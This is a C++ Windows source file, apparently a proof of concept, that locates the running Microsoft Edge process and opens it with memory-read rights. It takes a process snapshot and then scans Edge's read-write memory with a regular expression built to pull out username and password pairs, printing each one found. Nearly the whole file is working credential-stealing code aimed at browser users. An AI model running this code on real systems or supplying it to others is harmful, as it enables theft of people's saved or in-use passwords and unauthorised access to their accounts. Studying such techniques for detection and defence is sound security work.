#include <windows.h>
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <regex>

#pragma comment(lib, "advapi32.lib")

// Helper for CMD colors
void SetColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}



// Extraction Logic based on the C# pattern
void ScanMemoryRegions(HANDLE hProcess) {
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Scanning captured snapshot regions for credentials..." << std::endl;

    unsigned char* address = nullptr;
    MEMORY_BASIC_INFORMATION memInfo;
    std::set<std::string> seen;

    std::regex credPattern(R"([a-zA-Z]https? ([a-zA-Z0-9\\-_\.@\?]{1,20}) ([a-zA-Z0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40}))");

    while (VirtualQueryEx(hProcess, address, &memInfo, sizeof(memInfo)) != 0) {
        if (memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE) {
            std::vector<char> buffer(memInfo.RegionSize);
            SIZE_T bytesRead;

            if (ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer.data(), memInfo.RegionSize, &bytesRead)) {
                std::string chunk;
                chunk.reserve(bytesRead);
                for (SIZE_T i = 0; i < bytesRead; ++i) {
                    chunk += (buffer[i] == 0x00) ? ' ' : buffer[i];
                }

                std::smatch match;
                std::string::const_iterator searchStart(chunk.cbegin());
                while (std::regex_search(searchStart, chunk.cend(), match, credPattern)) {
                    std::string user = match[1].str();
                    std::string pass = match[2].str();
                    
                    // Filter out short junk or common false positives
                    if (user.length() > 3 && pass.length() > 3) {
                        std::string entry = user + " : " + pass;
                        if (seen.find(entry) == seen.end()) {
                            SetColor(10); std::cout << "[!] "; SetColor(7);
                            std::cout << "Match Found: "; SetColor(15);
                            std::cout << entry << std::endl;
                            seen.insert(entry);
                        }
                    }
                    searchStart = match.suffix().first;
                }
            }
        }
        address += memInfo.RegionSize;
    }
}



// Search for the process' PID by its name -- Currently, the process name is hardcoded here but I can always change it to user input (Out of Scope for this PoC)
DWORD GetPidByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(entry);
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (std::wstring(entry.szExeFile) == processName) {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &entry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}



// Main FCT
int main() {
    std::wstring targetName = L"msedge.exe";
    
    // Process Scan
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Scanning processes for " << targetName << std::endl;
    DWORD targetPid = GetPidByName(targetName);
    if (targetPid == 0) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "Could not find " << std::string(targetName.begin(), targetName.end()) << std::endl;
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Found " << targetName << L" at PID " << targetPid << L"\n" << std::endl;



    // Handle to Edge process with limited perms: PROCESS_QUERY_INFORMATION & PROCESS_VM_READ
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Creating handle to process " << targetPid << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProcess) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "OpenProcess failed. Error: " << GetLastError() << std::endl;
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Handle to process acquired!\n" << std::endl;



    // Process Snapshotting logic
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Attempting Process Snapshot... " << std::endl;
    HPSS hSnapshot = NULL;
    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
    DWORD result = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, 0, &hSnapshot);
    if (result != ERROR_SUCCESS) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "Snapshot failed. Error Code: " << result << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Process successfully Snapshotted!\n" << std::endl;



    // Run the memory scan logic directly on the process (frozen by snapshot context)
    ScanMemoryRegions(hProcess);



    // Cleanup
    PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
    CloseHandle(hProcess);
    
    SetColor(14); std::cout << "\n[*] "; SetColor(7);
    std::cout << "Task complete." << std::endl;
    return 0;
}
